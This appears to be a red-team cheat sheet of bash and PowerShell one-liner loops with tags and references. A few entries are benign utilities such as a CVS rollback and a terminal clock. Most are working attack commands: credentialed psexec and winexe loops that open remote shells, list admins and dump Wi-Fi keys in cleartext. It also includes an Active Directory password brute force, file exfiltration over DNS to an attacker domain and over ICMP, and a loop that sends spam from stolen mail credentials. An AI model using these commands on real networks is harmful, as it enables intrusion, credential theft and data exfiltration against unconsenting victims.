### 1. roll back cvs change
```
file=cvs.txt; cvs update -r $(cvs log $file | grep ^revision | sed -n 2p | awk '{print $NF}') $file && mv $file{,.old} && cvs update -A $file && mv $file.old $file && cvs commit -m "Reverted to previous version" $file
```
**- linux,bash,loop**
#### References:

http://tulrich.com/geekstuff/cvs.html
__________
### 2. Display system clock in terminal top right corner! :-)
```
while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &
```
**- linux,bash,loop,interesting**
#### References:

http://www.computerhope.com/unix/utput.htm
__________
### 3. loop to find user shares
```
for host in $(cat ../nmap/[IP File]); do echo "Trying $host"; smbclient -L $host -U  [DOM]/[USER]%'[PASS]'; done
```
**- linux,bash,loop,enumeration,smb**
#### References:

https://www.samba.org/samba/docs/man/manpages-3/smbclient.1.html
https://yg.ht
__________
### 4. loop for who is where
```
for host in $(cat userhosts.txt); do echo $host; psexec.py [DOMAIN]/[user]:'[pass]'@$host 'WMIC ComputerSystem Get UserName'; done | tee loggedin-dirty.txt;cat loggedin-dirty.txt | grep -v "^\[" | grep -v "^Impacket" | grep -v "^Trying" | grep -v "SMB SessionError" | sed '/^$/d'
```
**- loop,enumeration,user information,smb,impacket**
#### References:

https://yg.ht
https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 5. loop to look for dual homed hosts
```
for host in $(cat ../nmap/IPs-SMB.txt); do echo $host; psexec.py [DOMAIN]/[user]:'[pass]'@$host "ipconfig"; done | grep "IPv4 Address\|Ethernet adapter\|^[0-9]" | sed '/^$/d' | tee dualhomed-search.txt
```
**- networking,loop,enumeration,impacket**
#### References:

https://yg.ht
https://technet.microsoft.com/en-gb/library/bb490921.aspx
__________
### 6. loop to find local admins
```
for i in `cat smb_up `; do timeout 10 psexec.py [user]:[pass]@$i net localgroup administrators; done | tee local_admin_information
```
**- linux,loop,enumeration,user information,impacket**
#### References:

https://technet.microsoft.com/en-us/library/bb490706.aspx
__________
### 7. turn loop for local admins into csv
```
egrep -v "(\*\] T|\[\*\] F|[\*\] C|[\*\] U|[\*\] S|[\*\] R)" local_admin_information | egrep -v "(\[\*\] P|\[\*\] R|\[\*\] S|\[\*\] O|\[\*\] U)" | grep -v "Alias name" | grep -v "Administrators have complete" | grep -v \[\!\] | grep -v \[-\] | dos2unix | grep -v "^$" | sed s/"\[\*\] Creating service.*on"/''/g | grep -v Members | sed s/\\.\\.\\.\\.\\./','/g | sed s/"^ "/"€"/g | sed s/'The command completed successfully.'/€/g | tr "\n" "," | tr € "\n" | grep -v "^$" | sort | uniq  > local_admins.csv
```
**- linux,bash,text manipulation,loop,user information,interesting**
#### References:

http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
__________
### 8. loop around and open cmd, Psexecy.py != psexec msf != sysinternals psexec
```
for host in $(cat hosts.txt); do psexec.py [DOM]/[USER]:'[PASS]'@$host "cmd.exe"; done
```
**- linux,loop,impacket,remote command shell**
#### References:

https://yg.ht
https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 9. loop dump wifi keys
```
for host in $(cat localsubnet.txt); do echo "Trying $host"; winexe --user [Domain]/[user]%[pass] //$host "netsh wlan export profile name=[PROFILE] key=clear"; done
```
**- bash,loop,passwords,enumeration,wireless,wifi**
#### References:

https://yg.ht
https://www.labnol.org/software/find-wi-fi-network-password/28949/
__________
### 10. ARPing sweep network
```
for a in {0..254}; do arping -D -c 1 -I eth0 [NETWORK].$a; done | tee arping-[NET].txt
```
**- linux,networking,loop,scanning**
#### References:

https://yg.ht
https://www.cyberciti.biz/faq/linux-duplicate-address-detection-with-arping/
__________
### 11. NBTScan en masse
```
for a in {0..254}; do nbtscan -v -s : 192.168.$a.0/24 >> nbtscan-192.168.$a.txt; done
```
**- linux,loop,scanning,smb**
#### References:

https://yg.ht
http://unixwiz.net/tools/nbtscan.html
__________
### 12. network discovery RDNS
```
for a in {0..255}; do host -t ns $a.168.192.in-addr.arpa | grep -v "name server"; done >> networks.txt
```
**- networking,loop,scanning,dns**
#### References:

https://yg.ht
https://www.cyberciti.biz/faq/linux-unix-host-command-examples-usage-syntax/
__________
### 13. network discovery RDNS
```
cat networks-dirty.txt | grep "^[0-9]" | awk {'print $1'} | awk -F "." {'print $3"."$2"."$1".0/24"'} | sort -u > nets.txt
```
**- networking,loop,enumeration,dns**
#### References:

https://yg.ht
https://www.cyberciti.biz/faq/linux-unix-host-command-examples-usage-syntax/
__________
### 14. sslscan, you will want to git clone and make static if your in kali
```
for a in $(cat ../nmap/IPs-HTTPS.txt); do sslscan $a; done | tee sslscan-[NET].txt
```
**- loop,scanning,certificates**
#### References:

https://yg.ht
https://github.com/rbsec/sslscan
__________
### 15. nmap service discovery
```
for file in $( ls -lash | grep ".gnmap" | awk {'print $10'} ); do cat $file | grep "Ports" | grep "open" | awk {'print $2'} | sort -u > IPs-`echo $file | cut -d "-" -f 2 | cut -d "." -f 1;`.txt; done
```
**- bash,text manipulation,loop**
#### References:

http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
__________
### 16. powershell port scanning
```
$ports=([ports]);$ip=[ip];foreach ($port in $ports){try{$socket=New-Object System.Net.Sockets.TCPClient($ip,$port);}catch{}; if $socket -eq $NULL {echo $ip ": "$port" : Closed";}else{echo $ip ": "$port" : Open";}$socket = $NULL;}}
```
**- networking,loop,interesting,scanning,Windows,powershell**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 17. Simple powershell brute force, user input list, checks the password 'password'
```
Function Test-ADAuthentication {param($username,$password);echo "$username $password";(new-object directoryservices.directoryentry"",$username,$password).psbase.name -ne $null}; forEach ($userName in Get-Content "user_logins.txt"){Test-ADAuthentication $userName password >> test4.txt;}
```
**- loop,brute,Windows,powershell**
#### References:

https://msdn.microsoft.com/en-us/library/system.directoryservices.directoryentry(v=vs.110).aspx
http://serverfault.com/questions/596602/powershell-test-user-credentials-in-ad-with-password-reset
__________
### 18. exfil file through DNS, may want to encrypt, also assuming you have a short domain
```
for line in `base64 -w 62 [file]`; do host $line.[hostname]; done
```
**- linux,bash,loop,interesting**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 19. look for a free short domain, good luck
```
for a in {a..z}; do for b in {a..z}; do for c in {a..z}; do for d in {a..z}; do whois $a$b.$c$d; done; done;done;done
```
**- linux,networking,loop,dns**
#### References:

http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
__________
### 20. Exfil over icmp
```
ping -p 11010101010101010101010101010199 -c 1 -M do 127.0.0.1 -s 32; for line in `base64 sslfile.key | xxd -p -c 14`; do line2=`echo "11 $line 99" |tr -d ' '`; ping -p $line2 -c 1 -M do 127.0.0.1 -s 32; done; ping -p 11101010101010101010101010101099 -c 1 -M do 127.0.0.1 -s 32
```
**- linux,networking,loop,interesting**
#### References:

https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504
__________
### 21. tcp port scanning from bash, just wireshark on the ip, useful if you have cmd execution on web app
```
for i in {1..65000}; do echo 1 > /dev/tcp/[ip]/$i; echo $i; done
```
**- linux,bash,networking,loop,interesting,scanning**
#### References:

http://tldp.org/LDP/abs/html/devref1.html
__________
### 22. generate user list from PDF's, you can get more info to such as pdf maker
```
for i in *; do pdfinfo $i | egrep -i "Auth"; done  | sort
```
**- loop,enumeration,user information,interesting,recon**
#### References:

http://linuxcommand.org/man_pages/pdfinfo1.html
__________
### 23. Loop around 'dets' (user:pass) and send an email through an authenticated mailserver with an attached file whos contents is stored in 'email'
```
for i in `cat dets`; do echo "Sening Spam from $i"; mailx -s "Report Attached" -r "`echo $i | awk -F @ '{print $1}'`<`echo $i | awk -F : '{print $1}'`>" -a report.pdf -S smtp-auth=login -S smtp-auth-user="`echo $i | awk -F : '{print $1}'`" -S smtp-auth-password="` echo $i | awk -F : '{print $2}'`" -S ssl-verify=ignore -v -S smtp="10.11.1.229" [victim] < email;echo _________; done
```
**- networking,loop,interesting**
#### References:

http://www.binarytides.com/linux-mailx-command/
__________
### 24. Take the active users output and create filled in CMD's, course it can be anything, not just TSQL
```
for i in `cat ../clean_creds`; do echo $i | awk -F : '{print "tsql -S [IP] -p 1433 -U [domain]\\\\"$2" -P "$3}'; done
```
**- bash,loop,scanning**
#### References:

https://www.cyberciti.biz/faq/bash-for-loop/
__________
### 25. Convert exfil ICMP back to files from pcap
```
for line in $(tshark -r [pcap] -T fields -e data  | uniq | grep -v "......................................................" | sed s/.*11/11/g | grep "11.*99"  | sed s/11// | sed s/99$// | tr -d '\n' | sed s/0101010101010101010101010101/'\n'/g |sed s/010101010101010101010101010//g); do echo $line | xxd -r  -p | base64 -d;echo +++++++++++++++++++; done
```
**- linux,networking,loop**
#### References:

https://ask.wireshark.org/questions/15374/dump-raw-packet-data-field-only
__________
